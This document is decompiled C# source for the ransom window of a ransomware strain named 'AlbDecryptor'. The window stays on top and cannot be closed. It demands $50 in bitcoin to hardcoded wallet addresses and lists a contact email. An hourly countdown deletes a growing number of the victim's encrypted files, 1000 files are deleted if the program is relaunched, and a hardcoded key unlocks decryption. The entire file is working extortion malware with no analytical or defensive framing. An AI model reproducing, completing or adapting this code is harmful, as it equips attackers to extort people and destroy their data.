using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using Main.Properties;
using Main.Tools;

namespace Main;

public class FormGame : Form
{
	private static int _timeLeftSec;

	private static int _exponent;

	private const double Base = 1.1;

	private static int _indexNum;

	private IContainer components;

	private Label labelWelcome;

	private Timer timerTypingEffect;

	private Label labelTask;

	private TextBox textBoxAddress;

	private Button buttonCheckPayment;

	private Button buttonViewEncryptedFiles;

	private Timer timerCountDown;

	private Label labelCountDown;

	private Label labelFilesToDelete;

	private TextBox textBox1;

	private PictureBox pictureBox1;

	private Label label2;

	private Label label1;

	private TextBox textBox2;

	private Label label3;

	private LinkLabel linkLabel1;

	private Label label4;

	private Label label5;

	private PictureBox pictureBox2;

	private TextBox textBox3;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	public FormGame()
	{
		InitializeComponent();
	}

	private void FormGame_Load(object sender, EventArgs e)
	{
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		Windows.MakeTopMost((Form)(object)this);
		timerTypingEffect.set_Interval(125);
		timerTypingEffect.set_Enabled(true);
		((Control)labelWelcome).set_Text("");
		((Control)labelTask).set_Text(Config.TaskMessage);
		((Control)labelTask).set_Visible(false);
		((TextBoxBase)textBoxAddress).set_ReadOnly(true);
		((Control)textBoxAddress).set_Text(GetBitcoinAddess());
		((Control)textBoxAddress).set_Visible(false);
		((Control)buttonCheckPayment).set_Visible(false);
		((Control)buttonViewEncryptedFiles).set_Visible(false);
		((Control)labelCountDown).set_Visible(false);
		timerCountDown.set_Enabled(false);
		((Control)labelFilesToDelete).set_Visible(false);
		if (DidRun())
		{
			DeleteFiles(1000);
		}
	}

	private static bool DidRun()
	{
		string path = Path.Combine(Config.WorkFolderPath, "dr");
		if (File.Exists(path))
		{
			return true;
		}
		File.WriteAllText(path, "21");
		return false;
	}

	private static void DeleteFiles(int num)
	{
		try
		{
			int num2 = 0;
			foreach (string encryptedFile in Locker.GetEncryptedFiles())
			{
				if (num2 == num)
				{
					break;
				}
				File.Delete(encryptedFile + ".locked");
				num2++;
			}
		}
		catch (Exception)
		{
		}
	}

	private static string GetBitcoinAddess()
	{
		string path = Path.Combine(Config.WorkFolderPath, "Address.txt");
		if (File.Exists(path))
		{
			return File.ReadAllText(path);
		}
		HashSet<string> hashSet = new HashSet<string>();
		foreach (string item in Resources.vanityAddresses.Split(new string[1] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries).ToList())
		{
			hashSet.Add(item.Trim());
		}
		string text = hashSet.OrderBy((string x) => Guid.NewGuid()).FirstOrDefault();
		File.WriteAllText(path, text);
		return text;
	}

	private void FormGame_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		((CancelEventArgs)(object)e).Cancel = true;
		MessageBox.Show((IWin32Window)(object)this, "You are about to make a very bad decision. Are you sure about it?");
	}

	private void timerTypingEffect_Tick(object sender, EventArgs e)
	{
		string welcomeMessage = Config.WelcomeMessage;
		((Control)labelWelcome).set_Text(welcomeMessage.Substring(0, _indexNum) + "_");
		_indexNum++;
		if (_indexNum == welcomeMessage.Length + 1)
		{
			timerTypingEffect.set_Enabled(false);
			((Control)labelTask).set_Visible(true);
			((Control)textBoxAddress).set_Visible(true);
			((Control)buttonCheckPayment).set_Visible(true);
			((Control)buttonViewEncryptedFiles).set_Visible(true);
			((Control)labelCountDown).set_Visible(true);
			timerCountDown.set_Enabled(true);
			((Control)labelFilesToDelete).set_Visible(true);
			_timeLeftSec = 3600;
		}
	}

	private void buttonCheckPayment_Click(object sender, EventArgs e)
	{
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		int num = 3;
		try
		{
			if (num == 0)
			{
				new Thread((ThreadStart)delegate
				{
					//IL_0005: Unknown result type (might be due to invalid IL or missing references)
					MessageBox.Show("I Warned You!");
				}).Start();
				DeleteFiles(1000);
			}
			if (((Control)textBox2).get_Text() != "OoIsAwwF32cICQoLDA0ODe==")
			{
				MessageBox.Show($"Wrong Key! {--num} Tries Left!");
				return;
			}
			timerCountDown.Stop();
			((Control)buttonCheckPayment).set_Enabled(false);
			((Control)buttonCheckPayment).set_BackColor(Color.Lime);
			((Control)buttonCheckPayment).set_Text("Great job, I'm decrypting your files...");
			MessageBox.Show((IWin32Window)(object)this, "Decrypting your files. \nIt will take a while. \nThen I will close and completely remove myself from your computer.", "Great job");
			Locker.DecryptFiles(".locked");
			Hacking.RemoveItself();
		}
		catch
		{
			((Control)buttonCheckPayment).set_Text("This is not correct key!");
			((Control)buttonCheckPayment).set_BackColor(Color.Tomato);
		}
	}

	private void buttonViewEncryptedFiles_Click(object sender, EventArgs e)
	{
		((Form)new FormEncryptedFiles()).Show((IWin32Window)(object)this);
	}

	private void timerCountDown_Tick(object sender, EventArgs e)
	{
		if (_timeLeftSec > 0)
		{
			_timeLeftSec--;
			int num = _timeLeftSec / 60;
			int num2 = _timeLeftSec % 60;
			((Control)labelCountDown).set_Text(num + ":" + num2);
		}
		else
		{
			_timeLeftSec = 3600;
			int num3 = (int)Math.Pow(1.1, _exponent);
			((Control)labelFilesToDelete).set_Text(num3 + " files will be deleted");
			_exponent++;
			DeleteFiles(num3);
		}
	}

	private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://en.wikipedia.org/wiki/Bitcoin");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_014e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0158: Expected O, but got Unknown
		//IL_01f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fe: Expected O, but got Unknown
		//IL_0482: Unknown result type (might be due to invalid IL or missing references)
		//IL_048c: Expected O, but got Unknown
		//IL_0523: Unknown result type (might be due to invalid IL or missing references)
		//IL_052d: Expected O, but got Unknown
		//IL_06fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0704: Expected O, but got Unknown
		//IL_079e: Unknown result type (might be due to invalid IL or missing references)
		//IL_07a8: Expected O, but got Unknown
		//IL_0904: Unknown result type (might be due to invalid IL or missing references)
		//IL_090e: Expected O, but got Unknown
		//IL_0992: Unknown result type (might be due to invalid IL or missing references)
		//IL_099c: Expected O, but got Unknown
		//IL_0a32: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a3c: Expected O, but got Unknown
		//IL_0d26: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d30: Expected O, but got Unknown
		//IL_0d55: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d5f: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(FormGame));
		labelWelcome = new Label();
		timerTypingEffect = new Timer(components);
		labelTask = new Label();
		textBoxAddress = new TextBox();
		buttonCheckPayment = new Button();
		buttonViewEncryptedFiles = new Button();
		timerCountDown = new Timer(components);
		labelCountDown = new Label();
		labelFilesToDelete = new Label();
		textBox1 = new TextBox();
		pictureBox1 = new PictureBox();
		label2 = new Label();
		label1 = new Label();
		textBox2 = new TextBox();
		label3 = new Label();
		linkLabel1 = new LinkLabel();
		label4 = new Label();
		label5 = new Label();
		pictureBox2 = new PictureBox();
		textBox3 = new TextBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		((Control)labelWelcome).set_AutoSize(true);
		((Control)labelWelcome).set_BackColor(Color.DarkRed);
		((Control)labelWelcome).set_Font(new Font("Lucida Console", 15f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)labelWelcome).set_ForeColor(Color.White);
		((Control)labelWelcome).set_Location(new Point(272, 9));
		((Control)labelWelcome).set_Name("labelWelcome");
		((Control)labelWelcome).set_Size(new Size(0, 20));
		((Control)labelWelcome).set_TabIndex(0);
		timerTypingEffect.add_Tick((EventHandler)timerTypingEffect_Tick);
		((Control)labelTask).set_AutoSize(true);
		((Control)labelTask).set_BackColor(Color.DarkRed);
		((Control)labelTask).set_Font(new Font("Lucida Console", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)labelTask).set_ForeColor(Color.White);
		((Control)labelTask).set_Location(new Point(273, 545));
		((Control)labelTask).set_Name("labelTask");
		((Control)labelTask).set_Size(new Size(349, 16));
		((Control)labelTask).set_TabIndex(1);
		((Control)labelTask).set_Text("Send 50$ worth of bitcoins here");
		textBoxAddress.get_AutoCompleteCustomSource().AddRange(new string[1] { "bc1quf9x0t94np9l2pn9lvs9danl5mmcruez88crre" });
		((Control)textBoxAddress).set_Location(new Point(276, 658));
		((Control)textBoxAddress).set_Name("textBoxAddress");
		((Control)textBoxAddress).set_Size(new Size(411, 20));
		((Control)textBoxAddress).set_TabIndex(2);
		((Control)textBoxAddress).set_Text("bc1quf9x0t94np9l2pn9lvs9danl5mmcruez88crre");
		((Control)buttonCheckPayment).set_BackColor(Color.Gold);
		((Control)buttonCheckPayment).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)buttonCheckPayment).set_Location(new Point(72, 556));
		((Control)buttonCheckPayment).set_Name("buttonCheckPayment");
		((Control)buttonCheckPayment).set_Size(new Size(135, 28));
		((Control)buttonCheckPayment).set_TabIndex(3);
		((Control)buttonCheckPayment).set_Text("Decrypt Files");
		((ButtonBase)buttonCheckPayment).set_UseVisualStyleBackColor(false);
		((Control)buttonCheckPayment).add_Click((EventHandler)buttonCheckPayment_Click);
		((Control)buttonViewEncryptedFiles).set_BackColor(Color.Gray);
		((Control)buttonViewEncryptedFiles).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)buttonViewEncryptedFiles).set_Location(new Point(40, 293));
		((Control)buttonViewEncryptedFiles).set_Name("buttonViewEncryptedFiles");
		((Control)buttonViewEncryptedFiles).set_Size(new Size(194, 23));
		((Control)buttonViewEncryptedFiles).set_TabIndex(4);
		((Control)buttonViewEncryptedFiles).set_Text("View encrypted files");
		((ButtonBase)buttonViewEncryptedFiles).set_UseVisualStyleBackColor(false);
		((Control)buttonViewEncryptedFiles).add_Click((EventHandler)buttonViewEncryptedFiles_Click);
		timerCountDown.set_Interval(1000);
		timerCountDown.add_Tick((EventHandler)timerCountDown_Tick);
		((Control)labelCountDown).set_AutoSize(true);
		((Control)labelCountDown).set_BackColor(Color.DarkRed);
		labelCountDown.set_BorderStyle((BorderStyle)2);
		((Control)labelCountDown).set_Font(new Font("Lucida Sans Unicode", 41f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)labelCountDown).set_ForeColor(Color.White);
		((Control)labelCountDown).set_Location(new Point(40, 319));
		((Control)labelCountDown).set_Name("labelCountDown");
		((Control)labelCountDown).set_Size(new Size(193, 69));
		((Control)labelCountDown).set_TabIndex(5);
		((Control)labelCountDown).set_Text("59:59");
		((Control)labelFilesToDelete).set_AutoSize(true);
		((Control)labelFilesToDelete).set_BackColor(Color.Transparent);
		((Control)labelFilesToDelete).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1));
		((Control)labelFilesToDelete).set_ForeColor(Color.White);
		((Control)labelFilesToDelete).set_Location(new Point(49, 270));
		((Control)labelFilesToDelete).set_Name("labelFilesToDelete");
		((Control)labelFilesToDelete).set_Size(new Size(172, 20));
		((Control)labelFilesToDelete).set_TabIndex(6);
		((Control)labelFilesToDelete).set_Text("1 file will be deleted.");
		textBox1.get_AutoCompleteCustomSource().AddRange(new string[2] { "What happen to my files ?", "All your files got locked and encrypted and can not be recovered without a key ." });
		((Control)textBox1).set_BackColor(SystemColors.Window);
		((Control)textBox1).set_Location(new Point(276, 42));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		((Control)textBox1).set_Size(new Size(552, 494));
		((Control)textBox1).set_TabIndex(8);
		((Control)textBox1).set_Text(componentResourceManager.GetString("textBox1.Text"));
		((Control)pictureBox1).set_BackColor(Color.DarkRed);
		pictureBox1.set_Image((Image)(object)Resources.always_encrypted);
		((Control)pictureBox1).set_Location(new Point(30, 42));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(226, 212));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(9);
		pictureBox1.set_TabStop(false);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_BackColor(Color.White);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)label2).set_Location(new Point(280, 53));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(310, 25));
		((Control)label2).set_TabIndex(10);
		((Control)label2).set_Text("What Happened to My Computer?");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(Color.White);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)label1).set_Location(new Point(280, 174));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(230, 25));
		((Control)label1).set_TabIndex(11);
		((Control)label1).set_Text("Can I Recover My Files ?");
		((Control)textBox2).set_Location(new Point(30, 530));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(226, 20));
		((Control)textBox2).set_TabIndex(12);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_ForeColor(SystemColors.ControlLightLight);
		((Control)label3).set_Location(new Point(27, 514));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(64, 13));
		((Control)label3).set_TabIndex(13);
		((Control)label3).set_Text("Decrypt key");
		((Control)linkLabel1).set_AutoSize(true);
		((Control)linkLabel1).set_Cursor(Cursors.get_Hand());
		((Control)linkLabel1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		linkLabel1.set_LinkColor(Color.White);
		((Control)linkLabel1).set_Location(new Point(68, 446));
		((Control)linkLabel1).set_Name("linkLabel1");
		((Control)linkLabel1).set_Size(new Size(129, 20));
		((Control)linkLabel1).set_TabIndex(14);
		((Label)linkLabel1).set_TabStop(true);
		((Control)linkLabel1).set_Text("What Is Bitcoin ?");
		linkLabel1.add_LinkClicked(new LinkLabelLinkClickedEventHandler(linkLabel1_LinkClicked));
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Location(new Point(25, 476));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(194, 13));
		((Control)label4).set_TabIndex(15);
		((Control)label4).set_Text("Contact us : faceookabcd8@gmail.com");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_BackColor(Color.White);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)label5).set_Location(new Point(280, 293));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(153, 25));
		((Control)label5).set_TabIndex(17);
		((Control)label5).set_Text("How Can I Pay?");
		((Control)pictureBox2).set_BackColor(Color.DarkRed);
		pictureBox2.set_Image((Image)(object)Resources.BC_Logo_);
		((Control)pictureBox2).set_Location(new Point(693, 545));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(135, 45));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox2.set_TabIndex(18);
		pictureBox2.set_TabStop(false);
		((Control)textBox3).set_Location(new Point(276, 564));
		((Control)textBox3).set_Name("textBox3");
		((TextBoxBase)textBox3).set_ReadOnly(true);
		((Control)textBox3).set_Size(new Size(411, 20));
		((Control)textBox3).set_TabIndex(19);
		((Control)textBox3).set_Text("16oNsfuEWkVfeD8wVdrXZrejWrFucRPSvA");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.DarkRed);
		((Form)this).set_ClientSize(new Size(840, 605));
		((Control)this).get_Controls().Add((Control)(object)textBox3);
		((Control)this).get_Controls().Add((Control)(object)textBoxAddress);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)linkLabel1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)labelFilesToDelete);
		((Control)this).get_Controls().Add((Control)(object)labelCountDown);
		((Control)this).get_Controls().Add((Control)(object)buttonViewEncryptedFiles);
		((Control)this).get_Controls().Add((Control)(object)buttonCheckPayment);
		((Control)this).get_Controls().Add((Control)(object)labelTask);
		((Control)this).get_Controls().Add((Control)(object)labelWelcome);
		((Control)this).set_ForeColor(SystemColors.AppWorkspace);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("FormGame");
		((Form)this).set_ShowIcon(false);
		((Control)this).set_Text("AlbDecryptor");
		((Form)this).add_FormClosing(new FormClosingEventHandler(FormGame_FormClosing));
		((Form)this).add_Load((EventHandler)FormGame_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
